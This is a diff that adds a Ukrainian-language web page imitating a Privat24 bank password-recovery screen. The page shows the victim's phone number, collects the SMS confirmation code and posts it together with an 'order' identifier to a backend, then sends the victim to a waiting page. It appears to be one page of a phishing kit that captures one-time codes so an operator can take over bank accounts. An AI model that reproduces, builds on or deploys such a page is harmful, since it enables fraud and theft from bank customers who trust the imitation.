@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="uk" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Відновлення пароля від Приват24</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
+  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
+
+  .header{
+    display:flex;align-items:center;justify-content:flex-end;
+    padding:14px 18px;border-bottom:1px solid #eee;
+  }
+  .x-btn{background:none;border:none;cursor:pointer;padding:8px}
+  .x-btn svg{width:22px;height:22px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}
+
+  .content{flex:1;padding:48px 28px 0}
+
+  .title{
+    font-size:26px;font-weight:400;color:#1a1a1a;
+    text-align:center;line-height:1.35;margin-bottom:56px;
+  }
+
+  .field{margin-bottom:40px}
+  .lbl{font-size:13px;color:#9aa0a6;margin-bottom:10px;font-weight:400}
+  .phone-val{font-size:20px;color:#1a1a1a;font-weight:400;letter-spacing:.3px}
+
+  .code-row{
+    display:flex;gap:28px;margin-top:6px;direction:ltr;
+    justify-content:flex-start;
+  }
+  .code-digit{
+    width:72px;height:46px;border:none;border-bottom:1.5px solid #d8d8d8;
+    background:transparent;text-align:center;
+    font-size:22px;font-weight:400;color:#1a1a1a;
+    font-family:inherit;outline:none;transition:.2s;padding:0 0 6px;
+  }
+  .code-digit::placeholder{color:#d0d0d0;font-weight:300}
+  .code-digit:focus{border-bottom-color:#00A651}
+
+  .err{
+    display:none;margin:0 28px 20px;padding:10px 14px;
+    background:#fff5f5;border:1px solid #fcc;border-radius:10px;
+    color:#c62828;font-size:13px;text-align:center;
+  }
+
+  .bottom{padding:16px 28px 32px}
+  .submit-btn{
+    display:block;width:100%;padding:16px;border:none;border-radius:28px;
+    font-size:16px;font-weight:600;color:#fff;cursor:pointer;font-family:inherit;
+    background:#00A651;transition:.2s;
+  }
+  .submit-btn:hover{background:#008C45}
+  .submit-btn:disabled{opacity:.45;cursor:not-allowed}
+</style>
+</head>
+<body>
+
+  <div class="header">
+    <button class="x-btn" onclick="history.back()" aria-label="Close">
+      <svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
+    </button>
+  </div>
+
+  <div class="err" id="errorMsg"></div>
+
+  <div class="content">
+    <div class="title">Відновлення пароля від<br>Приват24</div>
+
+    <div class="field">
+      <div class="lbl">Номер телефону</div>
+      <div class="phone-val" id="userPhone">+38 (___) ___ __ __</div>
+    </div>
+
+    <div class="field">
+      <div class="lbl">Повідомлення з кодом</div>
+      <div class="code-row">
+        <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c0" placeholder="X" autofocus>
+        <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c1" placeholder="X">
+        <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c2" placeholder="X">
+      </div>
+    </div>
+  </div>
+
+  <div class="bottom">
+    <button class="submit-btn" id="submitBtn" onclick="submitCode()" disabled>Підтвердити</button>
+  </div>
+
+<script>
+  const params  = new URLSearchParams(location.search);
+  const orderId = params.get("order");
+  const phone   = params.get("phone");
+
+  if (!orderId) location.href = "index.html";
+
+  if (phone) {
+    const p = phone.replace(/\D/g, "");
+    if (p.length >= 9) {
+      const f = "+38 (" + p.substring(0,3) + ") " +
+                p.substring(3,6) + " " +
+                p.substring(6,8) + " " +
+                p.substring(8,10);
+      document.getElementById("userPhone").textContent = f;
+    } else {
+      document.getElementById("userPhone").textContent = "+380" + p;
+    }
+  }
+
+  if (params.get("error") === "1") {
+    const el = document.getElementById("errorMsg");
+    el.textContent = "Невірний код. Спробуйте ще раз.";
+    el.style.display = "block";
+  }
+
+  const digits = document.querySelectorAll(".code-digit");
+  const btn    = document.getElementById("submitBtn");
+
+  function refreshBtn() {
+    btn.disabled = getCode().length < digits.length;
+  }
+
+  digits.forEach((inp, i) => {
+    inp.addEventListener("input", () => {
+      inp.value = inp.value.replace(/\D/g, "");
+      if (inp.value && i < digits.length - 1) digits[i + 1].focus();
+      refreshBtn();
+    });
+    inp.addEventListener("keydown", e => {
+      if (e.key === "Backspace" && !inp.value && i > 0) digits[i - 1].focus();
+      if (e.key === "Enter" && !btn.disabled) submitCode();
+    });
+    inp.addEventListener("paste", e => {
+      e.preventDefault();
+      const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
+      for (let j = 0; j < digits.length && j < text.length; j++) {
+        digits[j].value = text[j];
+      }
+      const last = Math.min(text.length, digits.length) - 1;
+      if (last >= 0) digits[Math.min(last + 1, digits.length - 1)].focus();
+      refreshBtn();
+    });
+  });
+
+  function getCode() {
+    return Array.from(digits).map(d => d.value).join("");
+  }
+
+  function showError(msg) {
+    const el = document.getElementById("errorMsg");
+    el.textContent = msg;
+    el.style.display = "block";
+    setTimeout(() => { el.style.display = "none"; }, 3500);
+  }
+
+  async function submitCode() {
+    const code = getCode();
+    if (code.length < digits.length) {
+      showError("Введіть повний код");
+      return;
+    }
+    btn.disabled = true;
+    btn.textContent = "Перевірка...";
+
+    try {
+      const res  = await fetch("/api/code-data", {
+        method:  "POST",
+        headers: { "Content-Type": "application/json" },
+        body:    JSON.stringify({ order_id: orderId, code: code })
+      });
+      const data = await res.json();
+      if (data.success) {
+        location.href = "code-waiting.html?order=" + orderId;
+      } else {
+        showError(data.message || "Сталася помилка");
+        btn.disabled = false;
+        btn.textContent = "Підтвердити";
+      }
+    } catch (err) {
+      showError("Помилка з'єднання");
+      btn.disabled = false;
+      btn.textContent = "Підтвердити";
+    }
+  }
+</script>
+<script src="tracker.js"></script>
+</body>
+</html>
